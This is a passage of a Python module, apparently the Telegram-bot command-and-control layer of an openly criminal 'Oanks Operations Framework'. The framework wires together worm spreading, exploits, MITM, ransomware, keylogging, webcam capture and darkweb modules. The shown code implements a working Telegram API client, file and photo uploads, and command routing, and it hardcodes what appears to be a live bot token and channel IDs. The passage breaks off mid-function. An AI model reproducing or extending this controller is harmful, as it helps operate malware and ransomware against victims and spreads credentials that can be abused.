#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║     ██████╗  █████╗ ███╗   ██╗██╗  ██╗███████╗                               ║
║    ██╔═══██╗██╔══██╗████╗  ██║██║ ██╔╝██╔════╝                               ║
║    ██║   ██║███████║██╔██╗ ██║█████╔╝ ███████╗                               ║
║    ██║   ██║██╔══██║██║╚██╗██║██╔═██╗ ╚════██║                               ║
║    ╚██████╔╝██║  ██║██║ ╚████║██║  ██╗███████║                               ║
║     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝                               ║
║                                                                              ║
║     OANKS OPERATIONS FRAMEWORK — PHASE 7: COMMAND CENTER                     ║
║     Classification: COMMAND_CENTER — ZERO EXECUTION ON IMPORT                ║
║     Creator: Oanks (@oanksnood)                                              ║
║     Module Type: Orchestration Layer (Imported by Phase 15)                  ║
║                                                                              ║
║     "The Overlord. The Brain. The Nerve Center.                              ║
║      Every command flows through here. Every phase bows to this throne."     ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

Phase 7: Command Center — Orchestrates all phases (1-15) via Telegram Bot.

This module provides:
    • 50+ command handlers (User, Admin, Worm, Shell categories)
    • Interactive inline keyboards with pagination and callback queries
    • Voice command support (speech-to-text integration)
    • File upload processing (Excel, CSV, JSON)
    • Inter-phase communication routing
    • Full Telegram Bot API integration
    • Oanks branding on every surface

INTEGRATION MAP:
    Phase 1  → Database, logging, crypto primitives
    Phase 5  → Account Factory (creation commands)
    Phase 6  → Premium System (payments, tiers, referrals, coupons)
    Phase 8  → Money Module (pricing, sales)
    Phase 9  → Security (encryption, stealth)
    Phase 10 → Worm Module (spread, exploit, MITM, DNS)
    Phase 11 → Ransomware (encrypt, destroy)
    Phase 12 → Distributed Ops (multi-node)
    Phase 13 → Darkweb Intelligence
    Phase 14 → AI Assistant (auto-decisions)
    Phase 15 → Deployment Orchestrator (imports THIS module)

USAGE (by Phase 15):
    from phase7_command_center import Phase7CommandCenter
    cc = Phase7CommandCenter(system_dict)
    cc.initialize()

NO MAIN ENTRY POINT. NO EXECUTION ON IMPORT. PURE MODULE.
"""

# ═══════════════════════════════════════════════════════════════════════════════
# STANDARD LIBRARY IMPORTS
# ═══════════════════════════════════════════════════════════════════════════════
import os
import sys
import re
import json
import hashlib
import sqlite3
import threading
import queue
import time
import random
import string
import datetime
import logging
import traceback
import base64
import io
import csv
import tempfile
import subprocess
import urllib.request
import urllib.parse
import urllib.error
import socket
import ssl
import html
import itertools
import functools
import inspect
import warnings
import types
import pathlib
import copy
import math
import statistics
import uuid
import zlib
import gzip
import binascii
import struct
import xml.etree.ElementTree as ET
from typing import (
    Dict, List, Tuple, Optional, Any, Set, Callable, Union,
    Iterator, Iterable, Mapping, Sequence, NamedTuple, TypeVar, Generic
)
from dataclasses import dataclass, field, asdict, is_dataclass
from collections import defaultdict, Counter, deque, OrderedDict
from enum import Enum, auto, IntEnum
from abc import ABC, abstractmethod
from contextlib import contextmanager, suppress
from functools import wraps, lru_cache, partial

# ═══════════════════════════════════════════════════════════════════════════════
# OANKS BRANDING CONSTANTS — EVERY SURFACE, EVERY OUTPUT
# ═══════════════════════════════════════════════════════════════════════════════

class OanksBranding:
    """Centralized Oanks branding. Injected into every response, every log,
    every keyboard, every error message. The mark of the Creator."""

    CREATOR = "Oanks (@oanksnood)"
    FRAMEWORK = "Oanks Operations Framework"
    PHASE = "Phase 7: Command Center"
    CODENAME = "OVERLORD"
    VERSION = "7.0.0-ALPHA"
    BUILD_DATE = "2026-08-02"
    CLASSIFICATION = "COMMAND_CENTER — ZERO EXECUTION ON IMPORT"

    BANNER_SMALL = """
    ╔═══════════════════════════════════════╗
    ║     👑 OANKS COMMAND CENTER 👑        ║
    ║         Phase 7 — OVERLORD            ║
    ╚═══════════════════════════════════════╝
    """

    BANNER_FULL = """
    ╔══════════════════════════════════════════════════════════════════════════════╗
    ║                                                                              ║
    ║     👑 OANKS OPERATIONS FRAMEWORK — PHASE 7: COMMAND CENTER 👑               ║
    ║                                                                              ║
    ║     Creator: Oanks (@oanksnood)    |    Codename: OVERLORD                 ║
    ║     Version: 7.0.0-ALPHA           |    Classification: COMMAND_CENTER     ║
    ║                                                                              ║
    ║     "Every command flows through here. Every phase bows to this throne."   ║
    ║                                                                              ║
    ╚══════════════════════════════════════════════════════════════════════════════╝
    """

    BANNER_SKULL = """
    ╔══════════════════════════════════════════════════════════════════════════════╗
    ║                                                                              ║
    ║           ☠️  OANKS COMMAND CENTER  ☠️                                       ║
    ║                                                                              ║
    ║              Phase 7 — The Overlord Awakens                                  ║
    ║                                                                              ║
    ║     "I am the nerve center. I am the brain that never sleeps.               ║
    ║      I route death to its destination. I am Oanks."                         ║
    ║                                                                              ║
    ╚══════════════════════════════════════════════════════════════════════════════╝
    """

    FOOTER = "\n👑 Powered by Oanks Operations Framework | @oanksnood 👑"
    FOOTER_INLINE = "👑 Oanks Framework v7.0 👑"

    EMOJI_USER = "👤"
    EMOJI_ADMIN = "🔒"
    EMOJI_WORM = "🐛"
    EMOJI_SHELL = "💻"
    EMOJI_PREMIUM = "💎"
    EMOJI_MONEY = "💰"
    EMOJI_SECURITY = "🔐"
    EMOJI_RANSOM = "🔒"
    EMOJI_DISTRIBUTED = "🌐"
    EMOJI_DARKWEB = "🕸️"
    EMOJI_AI = "🤖"
    EMOJI_BACK = "🔙"
    EMOJI_HOME = "🏠"
    EMOJI_REFRESH = "🔄"
    EMOJI_NEXT = "➡️"
    EMOJI_PREV = "⬅️"
    EMOJI_CHECK = "✅"
    EMOJI_CROSS = "❌"
    EMOJI_WARNING = "⚠️"
    EMOJI_INFO = "ℹ️"
    EMOJI_BOMB = "💣"
    EMOJI_FIRE = "🔥"
    EMOJI_SKULL = "☠️"
    EMOJI_CROWN = "👑"
    EMOJI_TARGET = "🎯"
    EMOJI_UPLOAD = "📤"
    EMOJI_DOWNLOAD = "📥"
    EMOJI_VOICE = "🎙️"
    EMOJI_FILE = "📁"
    EMOJI_EXCEL = "📊"
    EMOJI_JSON = "📋"
    EMOJI_CSV = "📑"
    EMOJI_STATS = "📈"
    EMOJI_LOGS = "📜"
    EMOJI_RESTART = "🔄"
    EMOJI_SHUTDOWN = "🛑"
    EMOJI_KILL = "💀"
    EMOJI_BACKUP = "💾"
    EMOJI_ANALYTICS = "📊"
    EMOJI_REVENUE = "💵"
    EMOJI_BROADCAST = "📢"
    EMOJI_COUPON = "🎫"
    EMOJI_REFERRAL = "🔗"
    EMOJI_VERIFY = "🔍"
    EMOJI_PRICE = "💲"
    EMOJI_STATUS = "📡"
    EMOJI_SPREAD = "🌊"
    EMOJI_SCAN = "🔭"
    EMOJI_CRACK = "🔨"
    EMOJI_MITM = "🕵️"
    EMOJI_DNS = "🌐"
    EMOJI_PAYLOAD = "📦"
    EMOJI_TARGET_SELECT = "🎯"
    EMOJI_WEBCAM = "📷"
    EMOJI_SCREENSHOT = "🖼️"
    EMOJI_KEYLOG = "⌨️"
    EMOJI_COMMAND = "⚡"


class OanksConfig:
    """Runtime configuration for Phase 7 Command Center."""

    TELEGRAM_BOT_TOKEN = "8848237248:AAH3eFMgO6YGtQDb9he43Ek5bPKqFRWIuwE"
    TELEGRAM_API_BASE = "https://api.telegram.org/bot{token}"
    TELEGRAM_CHANNEL_ID = "-1004353786643"
    TELEGRAM_ADMIN_BOT_ID = "8119969863"
    TELEGRAM_CHANNEL_URL = "t.me/allspammedbyoanks"

    RATE_LIMIT_DEFAULT = 30
    RATE_LIMIT_ADMIN = 120
    RATE_LIMIT_BURST = 5

    PAGE_SIZE_DEFAULT = 5
    PAGE_SIZE_MAX = 20
    PAGE_SIZE_MIN = 1

    MAX_FILE_SIZE_MB = 50
    ALLOWED_UPLOAD_EXTENSIONS = {".csv", ".json", ".xlsx", ".xls", ".txt", ".log"}

    CAT_USER = "user"
    CAT_ADMIN = "admin"
    CAT_WORM = "worm"
    CAT_SHELL = "shell"
    CAT_PREMIUM = "premium"
    CAT_MONEY = "money"
    CAT_SECURITY = "security"
    CAT_RANSOM = "ransom"
    CAT_DISTRIBUTED = "distributed"
    CAT_DARKWEB = "darkweb"
    CAT_AI = "ai"

    PREFIX_USER = "/"
    PREFIX_ADMIN = "/admin "
    PREFIX_WORM = "/worm "
    PREFIX_SHELL = "/"

    SESSION_TIMEOUT_SECONDS = 3600
    MAX_CONCURRENT_SESSIONS = 1000

    LOG_LEVEL = logging.DEBUG
    LOG_FORMAT = "[%(asctime)s] [OANKS-PHASE7] [%(levelname)s] %(message)s"
    LOG_DATE_FORMAT = "%Y-%m-%d %H:%M:%S"

    CACHE_TTL_SECONDS = 300
    CACHE_MAX_SIZE = 10000

    VOICE_COMMAND_ENABLED = True
    VOICE_MAX_DURATION_SECONDS = 60
    VOICE_SUPPORTED_LANGUAGES = ["en", "es", "fr", "de", "it", "pt", "ru", "zh", "ja", "ar"]

    ERROR_UNAUTHORIZED = "🚫 <b>ACCESS DENIED</b> 🚫\n\nYou lack the authority to wield this command.\nThe Overlord does not recognize your insignia."
    ERROR_RATE_LIMIT = "⏳ <b>RATE LIMITED</b> ⏳\n\nSlow down, soldier. The Overlord processes commands, not chaos."
    ERROR_INVALID_ARGS = "⚠️ <b>INVALID PARAMETERS</b> ⚠️\n\nYour command syntax is malformed. Consult /help for proper invocation."
    ERROR_PHASE_UNAVAILABLE = "🔌 <b>PHASE OFFLINE</b> 🔌\n\nThe requested phase module is not currently loaded in the system."
    ERROR_INTERNAL = "💥 <b>INTERNAL FAILURE</b> 💥\n\nThe Overlord encountered an unexpected error. Logged for analysis."
    ERROR_FILE_TOO_LARGE = "📦 <b>FILE TOO LARGE</b> 📦\n\nMaximum upload size: {max_size}MB. Compress or split your payload."
    ERROR_FILE_INVALID = "📄 <b>INVALID FILE FORMAT</b> 📄\n\nAccepted: {formats}. Your file does not meet Oanks standards."
    ERROR_NOT_PREMIUM = "💎 <b>PREMIUM REQUIRED</b> 💎\n\nThis command requires an active premium subscription.\nUse /premium to upgrade your arsenal."
    ERROR_SESSION_EXPIRED = "🔒 <b>SESSION EXPIRED</b> 🔒\n\nYour session has timed out. Re-authenticate to continue."


class OanksException(Exception):
    """Base exception for all Oanks Framework errors."""
    def __init__(self, message: str, code: str = "OANKS_ERR", details: Optional[Dict] = None):
        self.code = code
        self.details = details or {}
        super().__init__(message)

class OanksAuthException(OanksException):
    def __init__(self, message: str, details: Optional[Dict] = None):
        super().__init__(message, "OANKS_AUTH", details)

class OanksRateLimitException(OanksException):
    def __init__(self, message: str, retry_after: int = 60, details: Optional[Dict] = None):
        self.retry_after = retry_after
        super().__init__(message, "OANKS_RATE", details)

class OanksPhaseException(OanksException):
    def __init__(self, message: str, phase: str = "unknown", details: Optional[Dict] = None):
        self.phase = phase
        super().__init__(message, "OANKS_PHASE", details)

class OanksCommandException(OanksException):
    def __init__(self, message: str, command: str = "unknown", details: Optional[Dict] = None):
        self.command = command
        super().__init__(message, "OANKS_CMD", details)

class OanksFileException(OanksException):
    def __init__(self, message: str, filename: str = "unknown", details: Optional[Dict] = None):
        self.filename = filename
        super().__init__(message, "OANKS_FILE", details)


def oanks_command(category: str, description: str, admin_only: bool = False,
                  premium_only: bool = False, rate_limit: Optional[int] = None):
    """Decorator to register and configure command handlers."""
    def decorator(func: Callable) -> Callable:
        func._oanks_command = True
        func._oanks_category = category
        func._oanks_description = description
        func._oanks_admin_only = admin_only
        func._oanks_premium_only = premium_only
        func._oanks_rate_limit = rate_limit
        func._oanks_command_name = func.__name__.replace("cmd_", "").replace("_", " ")

        @wraps(func)
        def wrapper(self, telegram_id: int, args: List[str]) -> str:
            return func(self, telegram_id, args)
        return wrapper
    return decorator


def oanks_callback(action: str, description: str = ""):
    """Decorator to register callback query handlers."""
    def decorator(func: Callable) -> Callable:
        func._oanks_callback = True
        func._oanks_callback_action = action
        func._oanks_callback_description = description

        @wraps(func)
        def wrapper(self, callback_query: Dict[str, Any]) -> str:
            return func(self, callback_query)
        return wrapper
    return decorator


def timing_decorator(func: Callable) -> Callable:
    """Log execution time for performance monitoring."""
    @wraps(func)
    def wrapper(*args, **kwargs):
        start = time.perf_counter()
        try:
            result = func(*args, **kwargs)
            elapsed = time.perf_counter() - start
            if hasattr(args[0], '_logger'):
                args[0]._logger.debug(f"[TIMING] {func.__name__} executed in {elapsed:.4f}s")
            return result
        except Exception as e:
            elapsed = time.perf_counter() - start
            if hasattr(args[0], '_logger'):
                args[0]._logger.error(f"[TIMING] {func.__name__} FAILED after {elapsed:.4f}s: {e}")
            raise
    return wrapper


def retry_on_failure(max_retries: int = 3, delay: float = 1.0,
                     exceptions: Tuple[type, ...] = (Exception,)):
    """Retry decorator with exponential backoff."""
    def decorator(func: Callable) -> Callable:
        @wraps(func)
        def wrapper(*args, **kwargs):
            last_exception = None
            for attempt in range(max_retries):
                try:
                    return func(*args, **kwargs)
                except exceptions as e:
                    last_exception = e
                    if attempt < max_retries - 1:
                        sleep_time = delay * (2 ** attempt)
                        time.sleep(sleep_time)
            raise last_exception
        return wrapper
    return decorator


# ═══════════════════════════════════════════════════════════════════════════════
# DATA STRUCTURES
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class OanksUserSession:
    """Represents an active user session in the Command Center."""
    telegram_id: int
    username: Optional[str] = None
    first_name: Optional[str] = None
    last_name: Optional[str] = None
    language_code: str = "en"
    is_premium: bool = False
    is_admin: bool = False
    created_at: float = field(default_factory=time.time)
    last_activity: float = field(default_factory=time.time)
    command_count: int = 0
    current_menu: str = "main"
    menu_stack: List[str] = field(default_factory=list)
    context: Dict[str, Any] = field(default_factory=dict)
    rate_limit_bucket: float = 0.0
    rate_limit_last_check: float = field(default_factory=time.time)

    def touch(self) -> None:
        self.last_activity = time.time()
        self.command_count += 1

    def is_expired(self, timeout: int = OanksConfig.SESSION_TIMEOUT_SECONDS) -> bool:
        return (time.time() - self.last_activity) > timeout

    def push_menu(self, menu: str) -> None:
        if self.current_menu:
            self.menu_stack.append(self.current_menu)
        self.current_menu = menu

    def pop_menu(self) -> Optional[str]:
        if self.menu_stack:
            self.current_menu = self.menu_stack.pop()
            return self.current_menu
        self.current_menu = "main"
        return "main"


@dataclass
class OanksCommandResult:
    """Standardized result wrapper for all command executions."""
    success: bool
    message: str
    data: Optional[Dict[str, Any]] = None
    keyboard: Optional[List[List[Dict]]] = None
    parse_mode: str = "HTML"
    file_path: Optional[str] = None
    file_content: Optional[bytes] = None
    file_name: Optional[str] = None
    edit_message: bool = False
    message_id: Optional[int] = None

    @classmethod
    def ok(cls, message: str, **kwargs) -> "OanksCommandResult":
        return cls(success=True, message=message, **kwargs)

    @classmethod
    def error(cls, message: str, **kwargs) -> "OanksCommandResult":
        return cls(success=False, message=message, **kwargs)


@dataclass
class OanksFileUpload:
    """Represents an uploaded file in the system."""
    file_id: str
    file_name: str
    file_size: int
    mime_type: str
    file_path: Optional[str] = None
    content: Optional[bytes] = None
    parsed_data: Optional[Any] = None
    upload_time: float = field(default_factory=time.time)
    uploader_id: int = 0

    @property
    def extension(self) -> str:
        return os.path.splitext(self.file_name)[1].lower()

    @property
    def is_valid(self) -> bool:
        if self.file_size > OanksConfig.MAX_FILE_SIZE_MB * 1024 * 1024:
            return False
        if self.extension not in OanksConfig.ALLOWED_UPLOAD_EXTENSIONS:
            return False
        return True


@dataclass
class OanksVoiceCommand:
    """Represents a voice command transcription."""
    file_id: str
    duration: int
    mime_type: str
    file_size: int
    transcription: Optional[str] = None
    confidence: float = 0.0
    language: str = "en"
    parsed_command: Optional[str] = None
    parsed_args: List[str] = field(default_factory=list)

    @property
    def is_valid(self) -> bool:
        return (self.transcription is not None and 
                self.confidence > 0.5 and
                self.duration <= OanksConfig.VOICE_MAX_DURATION_SECONDS)


@dataclass
class OanksPaginationState:
    """Tracks pagination state for interactive lists."""
    user_id: int
    data_source: str
    current_page: int = 0
    page_size: int = OanksConfig.PAGE_SIZE_DEFAULT
    total_items: int = 0
    filters: Dict[str, Any] = field(default_factory=dict)
    sort_key: str = ""
    sort_asc: bool = True

    @property
    def total_pages(self) -> int:
        if self.total_items == 0:
            return 1
        return max(1, math.ceil(self.total_items / self.page_size))

    @property
    def has_next(self) -> bool:
        return self.current_page < self.total_pages - 1

    @property
    def has_prev(self) -> bool:
        return self.current_page > 0

    def next_page(self) -> None:
        if self.has_next:
            self.current_page += 1

    def prev_page(self) -> None:
        if self.has_prev:
            self.current_page -= 1


# ═══════════════════════════════════════════════════════════════════════════════
# TELEGRAM API CLIENT
# ═══════════════════════════════════════════════════════════════════════════════

class TelegramAPI:
    """Lightweight Telegram Bot API client. Real HTTP calls to api.telegram.org."""

    def __init__(self, token: Optional[str] = None):
        self.token = token or OanksConfig.TELEGRAM_BOT_TOKEN
        self.base_url = OanksConfig.TELEGRAM_API_BASE.format(token=self.token)
        self._session_lock = threading.RLock()
        self._last_request_time = 0.0
        self._request_count = 0
        self._error_count = 0
        self._logger = logging.getLogger("OanksTelegramAPI")
        self._ssl_context = ssl.create_default_context()
        self._ssl_context.check_hostname = True
        self._ssl_context.verify_mode = ssl.CERT_REQUIRED

    def _make_request(self, method: str, params: Optional[Dict] = None,
                      files: Optional[Dict] = None, timeout: int = 30) -> Dict:
        url = f"{self.base_url}/{method}"

        with self._session_lock:
            now = time.time()
            elapsed = now - self._last_request_time
            if elapsed < 0.034:
                time.sleep(0.034 - elapsed)
            self._last_request_time = time.time()
            self._request_count += 1

        try:
            if files:
                boundary = f"----OanksBoundary{random.randint(100000, 999999)}"
                body = self._build_multipart_body(params or {}, files, boundary)
                req = urllib.request.Request(
                    url, data=body,
                    headers={"Content-Type": f"multipart/form-data; boundary={boundary}",
                             "User-Agent": "OanksCommandCenter/7.0"},
                    method="POST"
                )
            else:
                data = json.dumps(params or {}).encode("utf-8")
                req = urllib.request.Request(
                    url, data=data,
                    headers={"Content-Type": "application/json",
                             "User-Agent": "OanksCommandCenter/7.0"},
                    method="POST"
                )

            with urllib.request.urlopen(req, timeout=timeout, context=self._ssl_context) as response:
                result = json.loads(response.read().decode("utf-8"))

                if not result.get("ok", False):
                    error_code = result.get("error_code", 0)
                    description = result.get("description", "Unknown error")
                    self._error_count += 1
                    self._logger.error(f"Telegram API error {error_code}: {description}")
                    raise OanksException(f"Telegram API error {error_code}: {description}", f"TG_API_{error_code}")

                return result.get("result", {})

        except urllib.error.HTTPError as e:
            self._error_count += 1
            self._logger.error(f"HTTP error {e.code}: {e.reason}")
            raise OanksException(f"HTTP {e.code}: {e.reason}", f"TG_HTTP_{e.code}")
        except urllib.error.URLError as e:
            self._error_count += 1
            self._logger.error(f"URL error: {e.reason}")
            raise OanksException(f"Network error: {e.reason}", "TG_NETWORK")
        except socket.timeout:
            self._error_count += 1
            self._logger.error("Request timeout")
            raise OanksException("Request timeout — Telegram servers unresponsive", "TG_TIMEOUT")
        except Exception as e:
            self._error_count += 1
            self._logger.error(f"Unexpected error: {str(e)}")
            raise OanksException(f"Unexpected error: {str(e)}", "TG_UNKNOWN")

    def _build_multipart_body(self, params: Dict, files: Dict, boundary: str) -> bytes:
        lines = []
        for key, value in params.items():
            if value is not None:
                lines.append(f"--{boundary}".encode())
                lines.append(f'Content-Disposition: form-data; name="{key}"'.encode())
                lines.append(b"")
                lines.append(str(value).encode())

        for field_name, file_info in files.items():
            filename = file_info.get("filename", "file")
            content = file_info.get("content", b"")
            mime_type = file_info.get("mime_type", "application/octet-stream")
            lines.append(f"--{boundary}".encode())
            lines.append(f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"'.encode())
            lines.append(f"Content-Type: {mime_type}".encode())
            lines.append(b"")
            lines.append(content if isinstance(content, bytes) else content.encode())

        lines.append(f"--{boundary}--".encode())
        lines.append(b"")
        return b"\r\n".join(lines)

    @timing_decorator
    def send_message(self, chat_id: Union[int, str], text: str, parse_mode: str = "HTML",
                     disable_web_page_preview: bool = True, disable_notification: bool = False,
                     reply_to_message_id: Optional[int] = None,
                     reply_markup: Optional[Dict] = None, protect_content: bool = False) -> Dict:
        params = {
            "chat_id": chat_id, "text": text[:4096], "parse_mode": parse_mode,
            "disable_web_page_preview": disable_web_page_preview,
            "disable_notification": disable_notification, "protect_content": protect_content
        }
        if reply_to_message_id: params["reply_to_message_id"] = reply_to_message_id
        if reply_markup: params["reply_markup"] = reply_markup
        return self._make_request("sendMessage", params)

    @timing_decorator
    def edit_message_text(self, chat_id: Union[int, str], message_id: int, text: str,
                          parse_mode: str = "HTML", reply_markup: Optional[Dict] = None) -> Dict:
        params = {"chat_id": chat_id, "message_id": message_id, "text": text[:4096],
                  "parse_mode": parse_mode, "disable_web_page_preview": True}
        if reply_markup: params["reply_markup"] = reply_markup
        return self._make_request("editMessageText", params)

    @timing_decorator
    def delete_message(self, chat_id: Union[int, str], message_id: int) -> bool:
        result = self._make_request("deleteMessage", {"chat_id": chat_id, "message_id": message_id})
        return result is True

    @timing_decorator
    def send_document(self, chat_id: Union[int, str], document: bytes, filename: str,
                       caption: Optional[str] = None, parse_mode: str = "HTML",
                       disable_notification: bool = False, reply_markup: Optional[Dict] = None) -> Dict:
        params = {"chat_id": chat_id}
        if caption: params["caption"] = caption[:1024]; params["parse_mode"] = parse_mode
        if disable_notification: params["disable_notification"] = True
        if reply_markup: params["reply_markup"] = reply_markup
        files = {"document": {"filename": filename, "content": document, "mime_type": "application/octet-stream"}}
        return self._make_request("sendDocument", params, files)

    @timing_decorator
    def send_photo(self, chat_id: Union[int, str], photo: bytes, filename: str,
                    caption: Optional[str] = None, parse_mode: str = "HTML",
                    reply_markup: Optional[Dict] = None) -> Dict:
        params = {"chat_id": chat_id}
        if caption: params["caption"] = caption[:1024]; params["parse_mode"] = parse_mode
        if reply_markup: params["reply_markup"] = reply_markup
        files = {"photo": {"filename": filename, "content": photo, "mime_type": "image/jpeg"}}
        return self._make_request("sendPhoto", params, files)

    @timing_decorator
    def send_voice(self, chat_id: Union[int, str], voice: bytes, filename: str,
                    caption: Optional[str] = None, duration: Optional[int] = None,
                    reply_markup: Optional[Dict] = None) -> Dict:
        params = {"chat_id": chat_id}
        if caption: params["caption"] = caption[:1024]
        if duration: params["duration"] = duration
        if reply_markup: params["reply_markup"] = reply_markup
        files = {"voice": {"filename": filename, "content": voice, "mime_type": "audio/ogg"}}
        return self._make_request("sendVoice", params, files)

    @timing_decorator
    def answer_callback_query(self, callback_query_id: str, text: Optional[str] = None,
                               show_alert: bool = False, url: Optional[str] = None,
                               cache_time: int = 0) -> bool:
        params = {"callback_query_id": callback_query_id}
        if text: params["text"] = text[:200]
        if show_alert: params["show_alert"] = True
        if url: params["url"] = url
        if cache_time: params["cache_time"] = cache_time
        result = self._make_request("answerCallbackQuery", params)
        return result is True

    @timing_decorator
    def get_file(self, file_id: str) -> Dict:
        return self._make_request("getFile", {"file_id": file_id})

    @timing_decorator
    def download_file(self, file_path: str) -> bytes:
        url = f"https://api.telegram.org/file/bot{self.token}/{file_path}"
        req = urllib.request.Request(url, headers={"User-Agent": "OanksCommandCenter/7.0"})
        with urllib.request.urlopen(req, timeout=60, context=self._ssl_context) as response:
            return response.read()

    @timing_decorator
    def get_me(self) -> Dict:
        return self._make_request("getMe")

    @timing_decorator
    def get_chat(self, chat_id: Union[int, str]) -> Dict:
        return self._make_request("getChat", {"chat_id": chat_id})

    @timing_decorator
    def get_chat_member(self, chat_id: Union[int, str], user_id: int) -> Dict:
        return self._make_request("getChatMember", {"chat_id": chat_id, "user_id": user_id})

    @timing_decorator
    def set_webhook(self, url: str, certificate: Optional[bytes] = None,
                     max_connections: int = 40, allowed_updates: Optional[List[str]] = None) -> bool:
        params = {"url": url, "max_connections": min(max(max_connections, 1), 100)}
        if allowed_updates: params["allowed_updates"] = allowed_updates
        files = None
        if certificate:
            files = {"certificate": {"filename": "cert.pem", "content": certificate, "mime_type": "application/x-pem-file"}}
        result = self._make_request("setWebhook", params, files)
        return result is True

    @timing_decorator
    def delete_webhook(self, drop_pending_updates: bool = False) -> bool:
        params = {}
        if drop_pending_updates: params["drop_pending_updates"] = True
        result = self._make_request("deleteWebhook", params)
        return result is True

    @timing_decorator
    def get_updates(self, offset: Optional[int] = None, limit: int = 100,
                     timeout: int = 30, allowed_updates: Optional[List[str]] = None) -> List[Dict]:
        params = {"limit": min(limit, 100), "timeout": min(timeout, 90)}
        if offset is not None: params["offset"] = offset
        if allowed_updates: params["allowed_updates"] = allowed_updates
        return self._make_request("getUpdates", params)

    @property
    def stats(self) -> Dict[str, Any]:
        return {
            "total_requests": self._request_count,
            "total_errors": self._error_count,
            "error_rate": (self._error_count / max(self._request_count, 1)) * 100,
            "last_request": self._last_request_time,
            "token_prefix": self.token[:10] + "..." if self.token else "none"
        }


# ═══════════════════════════════════════════════════════════════════════════════
# TELEGRAM WEBHOOK HANDLER
# ═══════════════════════════════════════════════════════════════════════════════

class TelegramWebhookHandler:
    """Processes incoming Telegram updates and routes them to handlers."""

    def __init__(self, command_center: "Phase7CommandCenter", api: Optional[TelegramAPI] = None):
        self._cc = command_center
        self._api = api or command_center._api
        self._logger = logging.getLogger("OanksWebhookHandler")
        self._update_stats = Counter()
        self._lock = threading.RLock()

    def process_update(self, update: Dict[str, Any]) -> Optional[str]:
        update_id = update.get("update_id", 0)
        try:
            with self._lock:
                self._update_stats["total"] += 1

            if "message" in update:
                return self._handle_message(update["message"], update_id)
            elif "callback_query" in update:
                return self._handle_callback_query(update["callback_query"])
            elif "inline_query" in update:
                return self._handle_inline_query(update["inline_query"])
            elif "chosen_inline_result" in update:
                return self._handle_chosen_inline_result(update["chosen_inline_result"])
            elif "edited_message" in update:
                return self._handle_edited_message(update["edited_message"])
            elif "channel_post" in update:
                return self._handle_channel_post(update["channel_post"])
            else:
                self._logger.warning(f"Unknown update type: {list(update.keys())}")
                with self._lock: self._update_stats["unknown"] += 1
                return None
        except Exception as e:
            self._logger.error(f"Error processing update {update_id}: {str(e)}")
            with self._lock: self._update_stats["errors"] += 1
            return f"ERROR: {str(e)}"

    def _handle_message(self, message: Dict[str, Any], update_id: int) -> Optional[str]:
        chat = message.get("chat", {})
        from_user = message.get("from", {})
        chat_id = chat.get("id")
        user_id = from_user.get("id", 0)
        username = from_user.get("username", "")
        first_name = from_user.get("first_name", "")
        last_name = from_user.get("last_name", "")
        language_code = from_user.get("language_code", "en")

        session = self._cc._get_or_create_session(user_id, username, first_name, last_name, language_code)
        session.touch()

        if not self._cc._check_rate_limit(session):
            self._api.send_message(chat_id, OanksConfig.ERROR_RATE_LIMIT, parse_mode="HTML")
            return "RATE_LIMITED"

        if "text" in message:
            return self._handle_text_message(chat_id, user_id, message["text"], message)
        elif "voice" in message:
            return self._handle_voice_message(chat_id, user_id, message["voice"], message)
        elif "document" in message:
            return self._handle_document_message(chat_id, user_id, message["document"], message)
        elif "photo" in message:
            return self._handle_photo_message(chat_id, user_id, message)
        else:
            self._logger.info(f"Unhandled message type from {user_id}")
            return "UNHANDLED"

    def _handle_text_message(self, chat_id: int, user_id: int, text: str, message: Dict) -> Optional[str]:
        if text.startswith("/"):
            return self._handle_command(chat_id, user_id, text, message)
        session = self._cc._sessions.get(user_id)
        if session and session.context.get("awaiting_input"):
            return self._handle_context_input(chat_id, user_id, text, session)
        response = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>Received your message, {html.escape(session.first_name or 'soldier')}.</b>\n"
            f"Use /help to see available commands.\n"
            f"{OanksBranding.FOOTER}"
        )
        self._api.send_message(chat_id, response, parse_mode="HTML")
        return "ECHO"

    def _handle_command(self, chat_id: int, user_id: int, text: str, message: Dict) -> Optional[str]:
        parts = text.split()
        full_command = parts[0].lower()
        args = parts[1:] if len(parts) > 1 else []
        if "@" in full_command: full_command = full_command.split("@")[0]
        result = self._cc.execute_command(user_id, full_command, args)
        if isinstance(result, OanksCommandResult):
            self._send_result(chat_id, result)
        else:
            self._api.send_message(chat_id, str(result), parse_mode="HTML")
        return f"CMD:{full_command}"

    def _handle_callback_query(self, callback_query: Dict[str, Any]) -> Optional[str]:
        query_id = callback_query.get("id", "")
        from_user = callback_query.get("from", {})
        user_id = from_user.get("id", 0)
        data = callback_query.get("data", "")
        message = callback_query.get("message", {})
        chat_id = message.get("chat", {}).get("id")
        message_id = message.get("message_id")

        self._api.answer_callback_query(query_id)
        result = self._cc.execute_callback(user_id, data, message_id, chat_id)

        if isinstance(result, OanksCommandResult):
            if result.edit_message and message_id:
                self._api.edit_message_text(chat_id, message_id, result.message,
                    parse_mode=result.parse_mode,
                    reply_markup={"inline_keyboard": result.keyboard} if result.keyboard else None)
            else:
                self._send_result(chat_id, result)
        return f"CB:{data}"

    def _handle_voice_message(self, chat_id: int, user_id: int, voice: Dict, message: Dict) -> Optional[str]:
        if not OanksConfig.VOICE_COMMAND_ENABLED:
            self._api.send_message(chat_id, "🎙️ <b>Voice commands are currently disabled.</b>\nText commands are fully operational.", parse_mode="HTML")
            return "VOICE_DISABLED"
        file_id = voice.get("file_id", "")
        duration = voice.get("duration", 0)
        mime_type = voice.get("mime_type", "audio/ogg")
        file_size = voice.get("file_size", 0)
        voice_cmd = OanksVoiceCommand(file_id=file_id, duration=duration, mime_type=mime_type, file_size=file_size)
        result = self._cc.execute_voice_command(user_id, voice_cmd)
        self._send_result(chat_id, result)
        return f"VOICE:{file_id}"

    def _handle_document_message(self, chat_id: int, user_id: int, document: Dict, message: Dict) -> Optional[str]:
        file_id = document.get("file_id", "")
        file_name = document.get("file_name", "unknown")
        file_size = document.get("file_size", 0)
        mime_type = document.get("mime_type", "application/octet-stream")
